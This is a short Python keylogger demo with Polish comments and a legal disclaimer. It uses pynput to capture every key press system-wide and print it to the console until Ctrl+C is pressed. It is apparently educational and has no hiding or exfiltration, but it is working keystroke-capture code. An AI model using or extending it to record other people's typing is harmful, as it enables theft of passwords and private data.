# keylogger.py
# Skrypt przechwytujący naciśnięte klawisze

#################################################################
# DISCLAIMER:                                                   #
# Skrypt może potencjalnie posłużyć do przechwycenia            #
# wrażliwych informacji, takich jak loginy i hasła.             #
# NIE NALEŻY uruchamiać tego skryptu na komputerach             #
# innych osób bez ich wiedzy i wyraźnej zgody.                  #
# (artykuły 267 oraz 269b Kodeksu karnego).                     #
# Skrypt służy wyłącznie celom edukacyjnym i demonstracyjnym    #
# NIE POPIERAM i NIE ZACHĘCAM do ŻADNYCH nielegalnych działań.  #
#################################################################

# Skorzystamy z biblioteki, która umożliwi
# przechwycenie naciśniętych klawiszy
# https://pypi.org/project/pynput/
# Można ją zainstalować poleceniem:
# pip install pynput
from pynput.keyboard import Listener

# funkcja callback przetwarzająca
# naciśnięty klawisz
def on_pressed(key):

    # Wypisujemy naciśnięty klawisz
    print(key)

    # Jeśli zostało naciśnięte Ctrl + C,
    # program kończy działanie
    if str(key) == r"'\x03'":
        raise KeyboardInterrupt()

try: 

    print("Ctr + C aby zakończyć")

    # Uruchamiamy nasłuch (przechwytywanie) klawiszy
    # i ustawiamy callback dla naciśniętego klawisza
    # na funkcję on_pressed
    with Listener(on_press=on_pressed) as listener:
        listener.join()

except KeyboardInterrupt:

    # Jeśli zostało naciśnięte Ctrl + C,
    # program kończy działanie
    print("Kończenie")
    quit()